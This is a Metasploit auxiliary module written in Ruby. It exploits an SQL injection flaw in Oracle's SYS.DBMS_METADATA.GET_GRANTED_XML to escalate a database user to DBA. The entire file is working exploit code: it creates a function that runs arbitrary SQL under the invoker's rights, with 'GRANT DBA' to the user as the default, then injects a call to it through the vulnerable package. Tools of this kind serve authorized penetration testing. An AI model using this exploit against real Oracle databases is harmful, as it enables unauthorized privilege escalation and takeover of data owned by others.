##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_GRANTED_XML',
      'Description'    => %q{
        This module will escalate a Oracle DB user to DBA by exploiting an sql injection
        bug in the SYS.DBMS_METADATA.GET_GRANTED_XML package/function.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.metasploit.com' ],
        ],
      'DisclosureDate' => 'Jan 5 2008'))

      register_options(
        [
          OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
        ], self.class)
  end

  def run
    return if not check_dependencies

    name = Rex::Text.rand_text_alpha(rand(10) + 1)

    function = "
      create or replace function #{datastore['DBUSER']}.#{name} return varchar2
      authid current_user is pragma autonomous_transaction;
      begin
      execute immediate '#{datastore['SQL']}';
      return '';
      end;
      "

    package = "select sys.dbms_metadata.get_granted_xml('''||#{datastore['DBUSER']}.#{name}()||''') from dual"

    clean = "drop function #{name}"

    print_status("Sending function...")
    prepare_exec(function)

    begin
      print_status("Attempting sql injection on SYS.DBMS_METADATA.GET_GRANTED_XML...")
      prepare_exec(package)
    rescue ::OCIError => e
      print_status("Removing function '#{name}'...")
      prepare_exec(clean)
    end
  end
end
